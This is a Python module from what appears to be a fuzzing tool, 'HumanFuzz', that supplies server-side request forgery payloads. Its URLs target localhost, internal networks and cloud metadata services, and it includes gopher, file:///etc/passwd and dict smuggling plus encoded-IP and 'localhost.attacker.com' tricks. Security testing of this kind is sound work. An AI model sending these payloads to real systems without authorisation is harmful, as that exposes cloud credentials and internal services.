"""
SSRF (Server-Side Request Forgery) payload module for HumanFuzz.
"""

from typing import List
from humanfuzz.payloads import Payload

def get_payloads(field_type: str = None) -> List[Payload]:
    """
    Get SSRF payloads, optionally filtered by field type.
    
    Args:
        field_type: Type of the field (optional)
        
    Returns:
        List of Payload objects
    """
    # Basic SSRF payloads targeting localhost
    localhost_payloads = [
        Payload("http://localhost/", "ssrf", "Basic Localhost", 
                "Basic SSRF targeting localhost"),
        Payload("http://127.0.0.1/", "ssrf", "IPv4 Localhost", 
                "SSRF using IPv4 localhost"),
        Payload("http://[::1]/", "ssrf", "IPv6 Localhost", 
                "SSRF using IPv6 localhost"),
    ]
    
    # SSRF payloads targeting internal networks
    internal_network_payloads = [
        Payload("http://192.168.0.1/", "ssrf", "Internal Router", 
                "SSRF targeting common internal router IP"),
        Payload("http://10.0.0.1/", "ssrf", "Internal Network", 
                "SSRF targeting internal network"),
        Payload("http://172.16.0.1/", "ssrf", "Internal Network", 
                "SSRF targeting internal network"),
    ]
    
    # SSRF payloads targeting cloud metadata services
    cloud_metadata_payloads = [
        Payload("http://169.254.169.254/latest/meta-data/", "ssrf", "AWS Metadata", 
                "SSRF targeting AWS metadata service"),
        Payload("http://metadata.google.internal/computeMetadata/v1/", "ssrf", "GCP Metadata", 
                "SSRF targeting Google Cloud metadata service"),
        Payload("http://169.254.169.254/metadata/v1/", "ssrf", "DigitalOcean Metadata", 
                "SSRF targeting DigitalOcean metadata service"),
    ]
    
    # SSRF payloads with protocol smuggling
    protocol_smuggling_payloads = [
        Payload("gopher://localhost:25/xHELO%20localhost", "ssrf", "Gopher SMTP", 
                "SSRF using Gopher protocol to access SMTP"),
        Payload("file:///etc/passwd", "ssrf", "Local File", 
                "SSRF using file protocol to read local files"),
        Payload("dict://localhost:11211/info", "ssrf", "Dict Memcached", 
                "SSRF using dict protocol to access Memcached"),
    ]
    
    # SSRF payloads with URL obfuscation
    obfuscation_payloads = [
        Payload("http://0177.0.0.1/", "ssrf", "Octal Encoding", 
                "SSRF using octal encoding of IP"),
        Payload("http://2130706433/", "ssrf", "Decimal Encoding", 
                "SSRF using decimal encoding of IP"),
        Payload("http://localhost.attacker.com/", "ssrf", "DNS Subdomain", 
                "SSRF using DNS subdomain confusion"),
    ]
    
    # Combine all payloads
    all_payloads = (localhost_payloads + internal_network_payloads + 
                   cloud_metadata_payloads + protocol_smuggling_payloads + 
                   obfuscation_payloads)
    
    # Filter by field type if specified
    if field_type:
        if field_type in ["url", "text", "search"]:
            # These field types are commonly vulnerable to SSRF
            return all_payloads
        elif field_type == "file":
            # File upload fields might be vulnerable to SSRF in certain contexts
            return localhost_payloads + cloud_metadata_payloads
        else:
            # Other field types are less likely to be vulnerable to SSRF
            return localhost_payloads
    
    return all_payloads
